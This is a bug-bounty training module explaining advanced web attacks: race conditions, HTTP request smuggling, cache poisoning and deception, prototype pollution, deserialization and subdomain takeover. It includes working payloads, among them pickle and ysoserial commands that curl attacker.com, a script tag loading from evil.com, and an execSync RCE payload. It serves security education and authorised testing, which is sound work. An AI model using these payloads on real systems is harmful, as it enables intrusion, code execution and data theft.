Advanced Web Exploitation

Bug Hunting • Module 09 • Advanced Techniques

Foundational vulnerabilities — XSS, SQLi, IDOR — are well understood and increasingly well defended. The techniques in this module target the architectural assumptions that underpin modern web infrastructure: concurrency handling, protocol parsing, caching behavior, language-level object models, serialization trust boundaries, and DNS delegation. These are the vulnerability classes that separate surface-level testing from research-grade exploitation. Each technique requires deeper understanding of how systems actually work, not just how they are supposed to work.

⏱ Race Conditions (TOCTOU)

A race condition occurs when the behavior of a system depends on the timing or sequence of uncontrollable events. In web applications, this typically manifests as a Time-of-Check to Time-of-Use (TOCTOU) flaw: the application checks a condition (balance, coupon validity, account existence) at one moment and acts on that condition at a later moment, with a gap between check and use where state can change. If an attacker can exploit that gap by sending concurrent requests, the system performs actions it was designed to prevent.

Understanding TOCTOU in Web Applications

Consider a payment endpoint. The server checks that a user has sufficient balance, deducts the amount, and records the transaction. These three operations are not atomic — they are separate database queries with microseconds between them. If two identical payment requests arrive simultaneously, both may pass the balance check before either deduction completes. The result: double-spending with a single account balance. The same logic applies to any state-dependent operation: redeeming a coupon, claiming a reward, voting, following a user, or creating a unique resource.

# Pseudocode: vulnerable payment flow def process_payment(user_id, amount): balance = db.query("SELECT balance FROM users WHERE id = ?", user_id) # --- RACE WINDOW STARTS HERE --- if balance >= amount: db.query("UPDATE users SET balance = balance - ? WHERE id = ?", amount, user_id) db.query("INSERT INTO transactions ...") return "Payment successful" # --- RACE WINDOW ENDS HERE --- return "Insufficient balance" # If two requests hit this endpoint within the race window, # both read the same balance and both succeed.

The Single-Packet Attack Technique

Traditional race condition exploitation sends requests in rapid succession, but network jitter introduces timing variance that makes results inconsistent. The single-packet attack eliminates this variable entirely. Instead of sending requests sequentially, the attacker crafts multiple HTTP requests and packs them into a single TCP packet. When the server receives the packet, it processes all requests virtually simultaneously because they arrive in the same network read operation. This technique was popularized by James Kettle at PortSwigger and dramatically increased the reliability of race condition exploitation.

For HTTP/1.1, the technique leverages the last-byte synchronization approach: send all requests except the final byte of each, then send all final bytes in one packet to trigger simultaneous processing. For HTTP/2, the approach is even cleaner — multiple requests are multiplexed over a single connection natively, so the attacker simply sends them in the same TCP frame.

Turbo Intruder for Race Conditions

Turbo Intruder is a Burp Suite extension purpose-built for sending requests at extreme speed with precise timing control. Unlike Burp's standard Intruder, Turbo Intruder uses a Python scripting engine that gives you full control over connection management, request timing, and concurrency. For race conditions, it supports the single-packet attack natively through its race.py template.

# Turbo Intruder — race condition script (race.py template) def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=30, pipeline=False) # Queue 30 identical requests for i in range(30): engine.queue(target.req, gate='race1') # Open the gate — all 30 fire simultaneously in one packet engine.openGate('race1') def handleResponse(req, interesting): table.add(req)

Practical Race Condition Scenarios

💰
Double-Spending
Redeeming a stored balance, gift card, or credit simultaneously from two sessions. Both requests pass the balance check before either deduction completes. Common in e-commerce and fintech applications.
🎫
Coupon / Promo Reuse
Single-use coupon codes redeemed multiple times by racing the redemption endpoint. The server checks "has this coupon been used?" and marks it used — but if both checks occur before either mark, both succeed.
👥
Follow / Like Manipulation
Social platforms that check "has this user already liked?" before incrementing a counter. Racing the like endpoint inflates counts beyond the one-per-user limit. Same pattern applies to votes, ratings, and reviews.
👤
Concurrent Account Creation
Racing registration endpoints to create multiple accounts with the same email or phone number, bypassing uniqueness constraints. Can be escalated to account takeover if password reset flows target the duplicate.
ℹ
Stok and Race Condition Hunting
Bug bounty hunter STOK has built a reputation around race condition exploitation, demonstrating repeatedly that these vulnerabilities exist in production systems at major companies. His methodology focuses on identifying any endpoint that performs a read-then-write pattern on shared state and targeting it with single-packet attacks. The key insight: race conditions are not exotic edge cases. They are systemic in any application that has not explicitly implemented atomic operations or database-level locking on state-changing endpoints.

Detection and Testing

Testing for race conditions requires a systematic approach. Identify every endpoint that modifies state: payments, redemptions, account operations, resource creation, and any action with a uniqueness constraint. Send 20–30 concurrent requests using Turbo Intruder's gate mechanism or a single-packet script. Compare responses: if more than one succeeds when only one should, you have a race condition. Document the window size (how many concurrent requests succeed) and the business impact (financial loss, data corruption, privilege escalation).

⚠
Race Conditions in Financial Endpoints
Race conditions in payment, transfer, or balance endpoints are treated as critical severity on virtually every program because they represent direct financial loss. When testing, use minimal amounts (if possible, use a test environment or the smallest denomination available). Document the vulnerability thoroughly and report immediately — do not attempt to maximize exploitation. A single successful double-spend with a $0.01 transfer demonstrates the same vulnerability as a $10,000 one, without the legal exposure.
Section 02

📦 HTTP Request Smuggling

HTTP request smuggling exploits discrepancies in how front-end and back-end servers determine the boundaries between HTTP requests. When a reverse proxy (front-end) and an application server (back-end) disagree on where one request ends and the next begins, an attacker can "smuggle" a hidden request inside what the front-end considers a single request. The smuggled request is processed by the back-end as a separate, attacker-controlled request — bypassing security controls, poisoning caches, and hijacking other users' responses.

The Front-End / Back-End Desync

Modern web infrastructure places reverse proxies, load balancers, or CDNs in front of application servers. Both layers must agree on request boundaries. HTTP provides two mechanisms for indicating request body length: the Content-Length header (CL) specifying exact byte count, and the Transfer-Encoding: chunked header (TE) using chunk-size delimiters. When front-end and back-end systems prioritize these headers differently, desynchronization occurs.

CL.TE, TE.CL, and TE.TE Variants

Variant Front-End Uses Back-End Uses Mechanism
CL.TE Content-Length Transfer-Encoding Front-end forwards the full body based on CL. Back-end processes chunks and stops at the first zero-length chunk, treating leftover bytes as the start of the next request.
TE.CL Transfer-Encoding Content-Length Front-end forwards all chunks. Back-end reads only CL bytes, treating the remainder as a new request. The smuggled content becomes a prefix to the next legitimate user's request.
TE.TE Transfer-Encoding Transfer-Encoding Both support TE, but one can be tricked into ignoring it via obfuscation (extra whitespace, capitalization, duplicate headers). The server that falls back to CL creates the desync.
# CL.TE smuggling example # Front-end uses Content-Length (13), back-end uses Transfer-Encoding POST / HTTP/1.1 Host: target.com Content-Length: 13 Transfer-Encoding: chunked 0 SMUGGLED # The front-end sees CL:13, forwards all 13 bytes. # The back-end reads chunked: "0\r\n\r\n" = end of first request. # "SMUGGLED" becomes the prefix of the NEXT request.
# TE.CL smuggling example # Front-end uses Transfer-Encoding, back-end uses Content-Length (3) POST / HTTP/1.1 Host: target.com Content-Length: 3 Transfer-Encoding: chunked 8 SMUGGLED 0 # The front-end processes chunks: "8\r\nSMUGGLED\r\n0\r\n\r\n" # The back-end reads only 3 bytes ("8\r\n"), treats the rest as a new request.

TE.TE Obfuscation Techniques

When both servers support Transfer-Encoding, the attacker must trick one into ignoring it. This is done by sending a malformed or obfuscated TE header that one server parses and the other rejects, causing it to fall back to Content-Length:

# TE.TE obfuscation — trick one server into ignoring TE Transfer-Encoding: xchunked # Unrecognized value Transfer-Encoding: chunked # Extra leading space Transfer-Encoding: chunked Transfer-Encoding: x # Duplicate with invalid second Transfer-Encoding:chunked # Missing space after colon X: x\r\nTransfer-Encoding: chunked # Header injection via newline Transfer-Encoding: chunked Transfer-encoding: x # Case variation

Exploitation: What Smuggling Enables

🔒 Bypassing Access Controls

  • ▶Front-end blocks requests to /admin but the smuggled request bypasses it
  • ▶WAF rules only inspect the outer request, not the smuggled payload
  • ▶IP-based restrictions defeated because the back-end sees the request as internal

💣 Weaponizing Smuggled Requests

  • ▶Smuggled XSS payload served to other users via response queue poisoning
  • ▶Cache poisoning by smuggling a request that maps a malicious response to a legitimate URL
  • ▶Credential capture by smuggling a request that redirects another user's request to an attacker-controlled server

Detection and Tools

James Kettle's HTTP Request Smuggler extension for Burp Suite automates detection by sending probe requests with deliberate CL/TE conflicts and observing response timing. A smuggling-vulnerable server will exhibit a measurable delay when the back-end waits for more data that the front-end has already terminated. Manual detection involves sending a CL.TE probe and observing whether a follow-up normal request times out or returns an unexpected response — indicating the smuggled prefix corrupted it.

⚠
Smuggling Affects Other Users
Request smuggling is inherently dangerous to test because a successful smuggle poisons the request pipeline for real users. The smuggled request prefix attaches to the next legitimate user's request, potentially causing errors, information disclosure, or session hijacking for an innocent user. Test only on staging environments when possible. On production, use the minimal detection probe (timing-based, not payload-based) and report immediately once confirmed. Never attempt full exploitation chains on live production traffic.
Section 03

🗃 Cache Poisoning

Web cache poisoning tricks a caching layer into storing a malicious response and serving it to subsequent users who request the same resource. Unlike most web vulnerabilities that affect one user at a time, a successful cache poison scales to every user who hits the cached URL — potentially the entire user base. The attack exploits the gap between what the cache considers the "key" for a request (the parts that determine whether two requests get the same cached response) and the "unkeyed" inputs that the application actually uses to generate the response.

How Web Caches Work

Caching layers (CDNs like Cloudflare, Akamai, Fastly, or application-level caches like Varnish) store responses indexed by a cache key. The cache key typically includes the request method, host, path, and query string. Headers, cookies, and other request components are usually excluded from the cache key — these are "unkeyed" inputs. If the application uses an unkeyed input to generate the response, the attacker controls part of the response content without affecting the cache key, meaning their poisoned response will be served to other users requesting the same URL.

Unkeyed Inputs and Header Injection

The most common cache poisoning vector is unkeyed HTTP headers that the application reflects into the response. The X-Forwarded-Host header is frequently used by applications to generate absolute URLs for links, scripts, and redirects. If this header is reflected into the page but excluded from the cache key, the attacker can inject an arbitrary host that controls script sources or redirect targets.

# Cache poisoning via X-Forwarded-Host # Attacker sends: GET /en/home HTTP/1.1 Host: target.com X-Forwarded-Host: evil.com # Application generates response containing: <script src="https://evil.com/static/app.js"></script> # Cache stores this response keyed to: GET target.com/en/home # Every subsequent visitor to /en/home loads JavaScript from evil.com

Other commonly exploitable unkeyed headers include X-Original-URL (overrides the request path on some servers like IIS with URL Rewrite), X-Rewrite-URL (similar path override), X-Forwarded-Scheme (can force HTTP redirect loops or inject scheme into URLs), and X-Forwarded-Proto.

Fat GET Requests

Some application servers process a body on GET requests even though the HTTP specification discourages it. If the server uses a body parameter to override a query parameter and the cache keys on the query string but not the body, the attacker can poison the cache with different parameter values. Send a GET request with a body containing a parameter that overrides a URL parameter — if the response reflects the body value and gets cached, subsequent users receive the poisoned version.

Cache Key Normalization

Caches may normalize the cache key differently than the application processes the request. If the cache normalizes the path (stripping trailing slashes, decoding percent-encoding) but the application does not, or vice versa, the attacker can create cache key collisions. For example, the cache may treat /profile and /profile%2f as the same key, but the application routes them differently — allowing a response from one path to be cached and served for the other.

Cache Poisoning to Stored XSS

The highest-impact cache poisoning outcome is stored XSS at scale. If the attacker can inject JavaScript through an unkeyed input and the poisoned response is cached, every visitor to that page executes the attacker's script. This is functionally equivalent to a stored XSS vulnerability, but it affects every user simultaneously rather than requiring individual targeting. A cache-poisoned XSS on a login page could harvest credentials from every user who visits it during the cache TTL.

Tools: Param Miner

Param Miner is a Burp Suite extension (also by James Kettle) that automates the discovery of unkeyed inputs. It sends requests with additional headers, cookies, and parameters, comparing responses to detect which inputs influence the response without being part of the cache key. It tests hundreds of known headers and parameters, identifying potential cache poisoning vectors automatically. Run Param Miner against every in-scope endpoint that returns a cacheable response (check for Cache-Control, Age, X-Cache headers).

⚠
Cache Poisoning Impacts Real Users
Like request smuggling, cache poisoning is inherently disruptive. A poisoned cache serves malicious content to real users for the duration of the cache TTL. When testing, use a cache-buster parameter (a unique query string parameter that creates a unique cache key for your test) so your poisoned response is only served to you. For example, append ?cb=your-unique-value to the URL. Never poison a production cache key that serves real traffic. Report with the cache-busted proof of concept.

👁 Web Cache Deception

Web cache deception (WCD) is the inverse of cache poisoning. In cache poisoning, the attacker forces the cache to store a malicious response. In web cache deception, the attacker tricks the cache into storing a legitimate but sensitive response — and then accesses the cached copy. The victim's private data (account pages, API responses, profile information) is cached under a URL the attacker can request, exposing it without any direct interaction with the victim's session.

The Difference from Cache Poisoning

🗃 Cache Poisoning

  • ▶Attacker controls the response content
  • ▶Goal: serve malicious content to other users
  • ▶Exploits unkeyed inputs that influence the response
  • ▶Impact: XSS, redirect, defacement at scale

👁 Cache Deception

  • ▶Attacker reads the legitimate response
  • ▶Goal: access another user's private data
  • ▶Exploits cache rules that store dynamic content
  • ▶Impact: information disclosure, account takeover

Path Confusion Attacks

The classic WCD attack exploits a mismatch between how the application server routes requests and how the cache determines whether to cache a response. Caches typically decide cacheability based on the file extension in the URL path: responses to .css, .js, .png, and .svg paths are cached because they are assumed to be static assets. Application servers, however, may ignore unrecognized path suffixes and serve the base resource regardless.

# Web Cache Deception — path confusion # Normal request: victim visits their account page GET /account/settings HTTP/1.1 Host: target.com Cookie: session=victim_session # Response: dynamic, contains PII (not cached) # Attacker crafts a link and tricks the victim into visiting: GET /account/settings/nonexistent.css HTTP/1.1 # Application server ignores "/nonexistent.css" suffix, # serves /account/settings with victim's data. # Cache sees ".css" extension, caches the response. # Attacker now requests the same URL (unauthenticated): GET /account/settings/nonexistent.css HTTP/1.1 # Cache serves the victim's private account page.

WCD via Path Parameter Pollution

Beyond simple path suffix attacks, WCD can exploit path parameters (semicolon-delimited segments like /account;param=value) and URL-encoded path separators. Some application frameworks (Java Servlet, Spring) treat semicolons as path parameter delimiters and strip them before routing, while the cache includes them in the cache key. The attacker constructs a URL like /account;x.css — the application serves /account (dynamic, personalized), but the cache sees a .css extension and stores it.

Other path confusion techniques include using encoded characters: /api/me%2fx.js (where %2f is a forward slash), /api/me%23x.css (where %23 is a hash), and dot-segment normalization differences where the cache and server resolve /static/../api/me differently.

Detecting Vulnerable Caching Configurations

To detect WCD, you need to understand the cache's rules. Look for cache indicator headers in responses: X-Cache: HIT or X-Cache: MISS, CF-Cache-Status (Cloudflare), Age (seconds since cached), and Cache-Control directives. Request a dynamic page with a static-looking path suffix. If the second request (without authentication) returns the same dynamic content with an X-Cache: HIT header, the page is vulnerable to web cache deception.

  1. Identify dynamic endpoints. Account pages, API responses, settings pages, dashboards — any URL that returns user-specific content based on session state.
  2. Append static extensions. Try /account/x.css, /account/x.js, /account/x.png. Check if the application still serves the dynamic content.
  3. Check cache headers. If the response includes cache indicators (X-Cache, Age, CF-Cache-Status), the response may be cached.
  4. Verify from another session. Request the same URL from a different session (or unauthenticated). If you receive the first user's data, cache deception is confirmed.
  5. Test path parameter variants. Try semicolons, encoded separators, and dot-segments if simple extension appending does not work.
✓
WCD is Underreported
Web cache deception is less well-known than traditional web vulnerabilities, which means it is underreported and programs may not have tested for it internally. The attack requires minimal technical sophistication — no code injection, no exploitation payloads. It only requires understanding how caching layers decide what to cache. If the program uses a CDN or any caching proxy, WCD should be on your test checklist.

🐦 Prototype Pollution

Prototype pollution is a JavaScript-specific vulnerability class that exploits the language's prototype-based inheritance model. Every JavaScript object inherits properties from its prototype chain, ultimately reaching Object.prototype. If an attacker can modify Object.prototype, every object in the application inherits the attacker-controlled property. This can lead to DOM-based XSS on the client side and remote code execution on the server side.

The JavaScript Prototype Chain

In JavaScript, objects do not contain all their own properties. When you access a property on an object, the runtime first checks the object itself, then its prototype, then the prototype's prototype, up the chain until it reaches Object.prototype (the root). If the property is not found anywhere in the chain, it returns undefined. Prototype pollution injects a property at the Object.prototype level so that every object that does not explicitly define that property will inherit the attacker's value.

// Normal prototype chain lookup const user = { name: 'alice' }; console.log(user.name); // 'alice' — found on the object itself console.log(user.toString); // [Function] — inherited from Object.prototype console.log(user.isAdmin); // undefined — not on object or any prototype // Prototype pollution attack Object.prototype.isAdmin = true; console.log(user.isAdmin); // true — inherited from polluted prototype const newUser = {}; console.log(newUser.isAdmin); // true — every new object inherits it too

How Pollution Occurs: Unsafe Property Assignment

Pollution typically happens when user-controlled input is passed to a recursive merge or deep-copy function that does not sanitize property names. If the input contains __proto__ or constructor.prototype, the merge function walks up the prototype chain and assigns properties to the prototype object itself rather than the target object.

// Vulnerable merge function function merge(target, source) { for (let key in source) { if (typeof source[key] === 'object') { if (!target[key]) target[key] = {}; merge(target[key], source[key]); } else { target[key] = source[key]; } } } // Attacker-controlled input (e.g., from JSON body or query parameter) const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}'); merge({}, malicious); // Now every object inherits isAdmin = true console.log({}.isAdmin); // true

Client-Side Prototype Pollution (DOM XSS)

On the client side, prototype pollution is typically introduced via URL parameters, hash fragments, or JSON input that feeds into a vulnerable JavaScript library's merge or extend function. Libraries like Lodash (before 4.17.12), jQuery (before 3.4.0), and numerous smaller utilities have had prototype pollution vulnerabilities. Once the prototype is polluted, the attacker needs a "gadget" — a piece of existing application code that reads a property from an object, finds the attacker's polluted value, and uses it in a dangerous way (typically as innerHTML, src attribute, or eval input).

# Client-side prototype pollution via URL # Many libraries parse query strings into objects recursively https://target.com/page?__proto__[innerHTML]=<img src=x onerror=alert(1)> # Or via hash fragment: https://target.com/page#__proto__[source]=//evil.com/xss.js # If the app later does something like: # element.innerHTML = config.template || defaults.innerHTML # And defaults.innerHTML was polluted, XSS executes.

Server-Side Prototype Pollution (RCE)

Server-side prototype pollution in Node.js applications is more severe because it can lead to remote code execution. The attack targets the same merge/extend pattern but on the server. Common RCE gadgets exploit how Node.js spawns child processes: the child_process module's spawn and exec functions read environment variables and shell options from the options object. If the prototype is polluted with properties like shell, env, or NODE_OPTIONS, subsequent process spawns execute attacker-controlled commands.

// Server-side prototype pollution to RCE // Pollute the prototype with child_process options // Attacker sends JSON body: { "__proto__": { "shell": "node", "NODE_OPTIONS": "--require /proc/self/environ" } } // Or targeting execArgv for child process fork: { "__proto__": { "execArgv": ["--eval=require('child_process').execSync('id')"] } }

Detecting Pollution Sinks and Gadget Hunting

Detection involves two steps: finding the pollution source (where attacker input reaches a vulnerable merge function) and finding a usable gadget (where polluted properties influence dangerous operations). For client-side testing, inject ?__proto__[testprop]=testval into URLs and check ({}).testprop in the browser console. If it returns "testval", the prototype is polluted. Then search the application's JavaScript for property accesses that read from objects without explicit property checks.

ℹ
Prototype Pollution Severity
Prototype pollution without a working gadget is typically rated as low/medium because it demonstrates a flaw but not exploitable impact. Prototype pollution with a confirmed XSS gadget is rated as the XSS severity (medium to high depending on context). Prototype pollution with server-side RCE is critical. Always hunt for gadgets before reporting — a pollution-to-RCE chain is worth significantly more than a standalone pollution report.

📁 Deserialization Attacks

Serialization converts an object in memory into a format that can be stored or transmitted (byte streams, JSON, XML). Deserialization reverses the process, reconstructing the object from the serialized data. When an application deserializes attacker-controlled data without validation, the attacker can manipulate the serialized stream to instantiate arbitrary objects, modify application state, or execute code. Insecure deserialization was recognized as OWASP A08 (Software and Data Integrity Failures) in the 2021 update.

Java Deserialization

Java's native serialization (ObjectInputStream) is the most notorious deserialization attack surface. When a Java application deserializes user input, the attacker can craft a serialized object graph that triggers dangerous method calls during deserialization. The attack does not require the target class to be vulnerable — it chains together methods from classes already on the application's classpath (called a "gadget chain") to achieve arbitrary code execution.

Serialized Java objects are identifiable by their magic bytes: AC ED 00 05 in hex, or rO0AB in Base64. Look for these in cookies, hidden form fields, API parameters, and any binary data transmitted between client and server.

# ysoserial — Java deserialization exploit generator # Generates serialized payloads that trigger RCE via known gadget chains # List available gadget chains $ java -jar ysoserial.jar # Generate a payload using the CommonsCollections1 gadget chain $ java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/rce-proof' | \ base64 -w0 > payload.txt # Common gadget chains (depend on target's classpath): # CommonsCollections1-7 — Apache Commons Collections # CommonsBeanutils1 — Apache Commons BeanUtils # Spring1-2 — Spring Framework # Groovy1 — Groovy runtime # JRMPClient — Java RMI (two-stage)

PHP Object Injection

PHP's unserialize() function reconstructs objects from serialized strings. If user input reaches unserialize(), the attacker can instantiate any class available to the application and control its properties. Exploitation targets PHP's magic methods — __wakeup() (called on deserialization), __destruct() (called when the object is garbage collected), and __toString() (called when the object is used as a string). PHP serialized data is identifiable by its format: O:4:"User":2:{s:4:"name";s:5:"alice";}.

Python Pickle

Python's pickle module is explicitly documented as unsafe for untrusted data. Pickle deserialization can execute arbitrary Python code by defining a __reduce__ method on the serialized object that returns a callable (like os.system) with attacker-controlled arguments. Pickled data often appears Base64-encoded in cookies, session stores, and message queues. Flask applications using the default cookie-based session store are a common target if the secret key is weak or leaked.

# Python pickle RCE payload import pickle import os class Exploit: def __reduce__(self): return (os.system, ('curl http://attacker.com/$(whoami)',)) payload = pickle.dumps(Exploit()) # Send this payload wherever the application calls pickle.loads()

.NET Deserialization

.NET applications using BinaryFormatter, SoapFormatter, NetDataContractSerializer, or ObjectStateFormatter are vulnerable to deserialization attacks. The ViewState mechanism in ASP.NET Web Forms is a particularly common target — if MAC validation is disabled or the validation key is known, the attacker can inject a malicious serialized payload into the ViewState field. The tool ysoserial.net generates .NET-specific gadget chain payloads.

Identifying Serialized Data

Language Signature Common Locations
Java AC ED 00 05 (hex) / rO0AB (base64) Cookies, API bodies, JMX, RMI, custom protocols
PHP O:4:"Name" or a:2:{ format Cookies, session files, form fields, database columns
Python \x80\x04\x95 (pickle v4) or base64-encoded blobs Cookies (Flask), message queues (Celery), caches (Redis)
.NET AAEAAAD (base64 BinaryFormatter) or ViewState blobs ViewState, cookies, MSMQ messages, WCF endpoints

Prevention

The only reliable prevention is to avoid deserializing untrusted data entirely. Use format-specific parsers (JSON, XML) instead of language-native serialization. If native serialization is unavoidable, implement strict allowlisting of permitted classes, use integrity checks (HMAC) on serialized data, and isolate deserialization in sandboxed environments with minimal permissions. Never rely on blocklisting — new gadget chains are discovered regularly, and blocklists are always incomplete.

⚠
Deserialization is Almost Always Critical
Insecure deserialization typically leads directly to remote code execution, which is the highest severity classification on any program. If you find serialized data in user-controllable input, it is worth significant investment to determine whether deserialization is actually performed server-side and which gadget chains are available. A confirmed Java deserialization to RCE on a production endpoint is among the highest-paying findings in bug bounty.

🌐 Subdomain Takeover

A subdomain takeover occurs when a DNS record (typically a CNAME) points to an external service that has been deprovisioned or was never fully configured. The subdomain resolves to the service's infrastructure, but because the service account no longer exists, the attacker can register the same resource name on the external service and claim the subdomain's traffic. This is sometimes called a "dangling DNS" vulnerability.

How Subdomain Takeover Works

  1. Organization creates a subdomain. The company sets up blog.target.com as a CNAME pointing to target-blog.herokuapp.com.
  2. Service is deprovisioned. The team deletes the Heroku app but forgets to remove the DNS CNAME record. The subdomain now resolves to Heroku's infrastructure, but no app claims it.
  3. Attacker claims the resource. The attacker creates a new Heroku app named target-blog and deploys their own content. Because the DNS CNAME still points to Heroku, blog.target.com now serves the attacker's content.
  4. Trust is inherited. The subdomain is under the target's domain, so it inherits trust: cookies scoped to .target.com, CSP allowlisting of *.target.com, and user trust in the domain name itself.

Fingerprinting Vulnerable Services

Not all external services are vulnerable to takeover. The service must allow new registrations to claim the same resource name that the CNAME points to. The can-i-take-over-xyz repository maintains a comprehensive database of which services are vulnerable and the fingerprint (error message or response) that indicates a dangling record.

Service Vulnerable? Fingerprint

Heroku Yes "No such app" or Heroku default page. Register the app name on a free Heroku account.

Automation with subjack and nuclei

# Subdomain enumeration + takeover detection pipeline # Step 1: Enumerate subdomains $ subfinder -d target.com -o subs.txt $ amass enum -passive -d target.com >> subs.txt $ sort -u subs.txt -o subs-unique.txt # Step 2: Resolve DNS and identify CNAMEs $ dnsx -l subs-unique.txt -cname -resp -o cnames.txt # Step 3: Check for dangling CNAMEs (automated) $ subjack -w subs-unique.txt -t 100 -timeout 30 -o takeovers.txt -ssl # Alternative: nuclei with takeover templates $ nuclei -l subs-unique.txt -t takeovers/ -o nuclei-takeovers.txt # Step 4: Manual verification — check the CNAME target $ dig blog.target.com CNAME # If CNAME points to a service returning an error fingerprint, verify takeover

Claiming the Subdomain and Reporting

When you confirm a dangling CNAME, claim the resource on the external service to prove the takeover. Deploy a simple proof-of-concept page containing only an identifier (your HackerOne username or a unique string) — never host malicious content or phishing pages. Take screenshots of the subdomain serving your proof-of-concept, then report the finding with the DNS record details, the external service, and evidence of the claim.

Impact Assessment

Subdomain takeover severity depends on what the subdomain's domain scope enables:

  • Cookie theft — If cookies are scoped to .target.com, the attacker's page on the subdomain can read session cookies for the parent domain. This escalates to account takeover.
  • CSP bypass — If the parent domain's Content Security Policy allowlists *.target.com, the attacker can host XSS payloads on the taken-over subdomain and bypass CSP restrictions on the main site.
  • Phishing and credibility — Users trust subdomains of known organizations. A taken-over subdomain is ideal for phishing campaigns targeting the organization's users or partners.
  • Email interception — If the subdomain has MX records or is used in email configurations, the attacker may intercept or send emails from the organization's domain.
✓
Subdomain Takeover at Scale
Large organizations with hundreds of subdomains and frequent infrastructure changes are the most likely to have dangling records. The attack surface grows with organizational complexity. Run subdomain enumeration and takeover checks regularly — new dangling records appear whenever a team decommissions a service without cleaning up DNS. Some hunters automate this entirely: enumerate subdomains nightly, diff against the previous day's results, and check new CNAMEs against the can-i-take-over-xyz database.
Section 08

🔗 Chaining Advanced Techniques

The techniques in this module are powerful individually, but their true potential emerges when chained together or combined with foundational vulnerabilities. Advanced chaining transforms medium-severity findings into critical exploit paths that demonstrate catastrophic impact. Programs pay for demonstrated impact, and a well-documented chain often pays more than the sum of its individual components.

Smuggling + Cache Poisoning

HTTP request smuggling and cache poisoning are natural partners. A smuggled request can force the back-end to generate a response that the cache associates with a legitimate URL. The smuggled request might redirect the response, inject headers, or serve entirely different content — and because the cache stores it under the original URL's cache key, every subsequent visitor receives the attacker's response. This is one of the most devastating web attacks because it requires no victim interaction and scales to the entire user base.

🔗 Example: Smuggling to Cache Poisoning to XSS
▼

The attacker exploits a CL.TE desync to smuggle a request that includes an X-Forwarded-Host: evil.com header. The back-end processes the smuggled request and generates a response that includes <script src="https://evil.com/app.js">. The cache stores this response under the legitimate URL's cache key (e.g., /en/home). Every visitor to /en/home for the duration of the cache TTL loads and executes JavaScript from the attacker's server. The chain: smuggling (to inject the unkeyed header) + cache poisoning (to store the malicious response) + XSS (the JavaScript payload) = persistent, scalable account takeover with no victim interaction.

Prototype Pollution + XSS

Prototype pollution alone is often rated low severity without a working gadget. But when combined with an XSS sink — a piece of application code that reads from the polluted prototype and writes to the DOM — it becomes a full client-side exploit. The pollution provides the injection vector, and the gadget provides the execution context. Some researchers specialize in hunting new gadgets in popular JavaScript libraries, turning "unexploitable" pollution reports into confirmed XSS.

🔗 Example: Pollution via URL + Library Gadget
▼

The application uses a JavaScript library that merges URL query parameters into a configuration object using a vulnerable deep-merge function. The attacker crafts a URL: ?__proto__[transport_url]=data:,alert(1)//. The library's merge function writes to Object.prototype. Later, the application's analytics module reads config.transport_url (which was never explicitly set, so it falls through to the prototype) and injects it as a script source. Result: DOM XSS triggered by visiting a crafted URL. The chain: prototype pollution (injection) + library gadget (execution) = reflected DOM XSS.

Race Condition + IDOR

Race conditions can amplify IDOR vulnerabilities beyond their normal scope. Consider a scenario where an application creates a temporary resource with predictable IDs, performs an action on it, and then deletes it. Individually, the IDOR on the resource and the race condition on the creation/deletion are each medium severity. Combined, the attacker races the creation process to access or modify the resource in the gap between creation and deletion, accessing data or performing actions that the normal IDOR window would not permit.

🔗 Example: Race Condition to Bypass Invitation Limits
▼

A SaaS platform allows each team to have a maximum of 5 members on the free tier. The invitation endpoint checks the current member count before sending an invite. The attacker sends 10 invitation requests simultaneously using a single-packet attack. All 10 requests check the member count at the same time (all see count=4), and all 10 pass validation before any invitation is processed. Result: 10 invitations sent, bypassing the 5-member limit. If the invitation creates user records with sequential IDs, the attacker also has an IDOR to enumerate and potentially access other team's invitation records. The chain: race condition (bypass limit check) + IDOR (enumerate invitations) = unauthorized access to premium features and data.

Real-World Chain Patterns

⛓
Open Redirect + OAuth
An open redirect on the application domain (low severity) chained with an OAuth misconfiguration that does not validate redirect URIs strictly (medium). The attacker redirects the OAuth callback to their server via the open redirect, stealing the authorization code. Result: account takeover (critical).
⛓
SSRF + Cloud Metadata
A blind SSRF that only confirms connection success (low/medium) chained with AWS metadata endpoint access. The attacker uses SSRF to reach 169.254.169.254/latest/meta-data/iam/security-credentials/ and extract temporary IAM credentials. Result: full cloud infrastructure access (critical).
⛓
Subdomain Takeover + Cookie Scope
A dangling CNAME takeover on a subdomain (medium) combined with cookies scoped to the parent domain. The attacker hosts a page on the taken-over subdomain that reads session cookies set for .target.com. Result: session hijacking for any user who visits the subdomain (high to critical).
⛓
Cache Deception + Sensitive Data
Web cache deception on an account settings page (medium) that exposes an API token in the cached response. The attacker uses the stolen token to access the API as the victim. Result: full API access as the victim, potentially including data export and account modification (critical).

When Advanced Techniques Pay

Advanced techniques have a higher time investment per finding than foundational ones. They pay off in three scenarios: when the target has a mature security posture and foundational vulnerabilities have already been found and fixed by other hunters; when the program offers significantly higher payouts for critical findings, making a single high-severity chain worth more than multiple medium reports; and when you are building a reputation as a specialist — advanced technique reports demonstrate expertise that leads to private program invitations and higher trust from triage teams.

The economics are straightforward: on a well-hardened target, spending 20 hours to find and chain a smuggling-to-cache-poisoning-to-XSS chain that pays $15,000 is more efficient than spending 40 hours searching for foundational vulnerabilities that have already been reported. On a new or poorly-secured target, start with the fundamentals — advanced techniques are wasted effort when IDOR and missing access controls are still present.

ℹ
Document Everything
When chaining, document each link in the chain with its own reproduction steps, then demonstrate the full chain end-to-end. This serves two purposes: if the triage team disputes one link, the remaining components are still individually reportable; and the full chain documentation demonstrates the cumulative impact that justifies the critical severity rating. Include a clear narrative that walks the reader from the initial entry point through each exploitation step to the final impact. The best chain reports read like a story, not a list of disconnected findings.
